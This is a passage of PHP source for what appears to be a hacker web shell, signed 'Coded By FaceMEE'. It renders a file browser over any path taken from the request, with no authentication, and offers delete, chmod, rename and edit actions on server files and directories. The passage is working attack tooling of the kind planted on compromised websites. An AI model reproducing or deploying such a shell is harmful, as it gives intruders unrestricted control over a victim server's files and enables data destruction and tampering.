echo '<font color="green">DONE</font><br />';
}else{
echo '<font color="red">ERROR</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Delete File Done.</font><br />';
}else{
echo '<font color="red">Delete File Error.</font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><font color=black><center>Name</center></td>
<td><font color=black><center>Size</center></td>
<td><font color=black><center>Permissions</center></td>
<td><font color=black><center>Options</center></td></font>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="Blue">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"selct\">Select</option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">>\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=''><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="Blue">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"select\">Select</option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">>\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
    

}
echo '<center><br><font color=lime>Copyrigth <font color=red >&copy;</font>2020 - 20'.date(y).'<font color=red >&hearts;</font> Coded By FaceMEE
<br></font>
</BODY>
</HTML>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms 
& 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
